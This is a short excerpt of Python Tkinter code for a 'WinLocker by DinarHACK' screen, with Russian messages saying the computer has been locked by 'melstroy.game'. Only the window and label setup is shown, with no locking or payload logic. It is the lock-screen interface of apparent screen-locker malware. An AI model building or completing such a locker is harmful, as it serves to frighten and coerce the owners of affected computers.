...
window = Tk()
window.title("WinLocker by DinarHACK")  
...
txt_one = Label(window, text='WinLocker by DinarHACK', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='салам от мелстро', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Ваш компьютер был заблокирован мелстро.геймом.', font=("Arial Bold", fontsize), fg='white', bg='black')
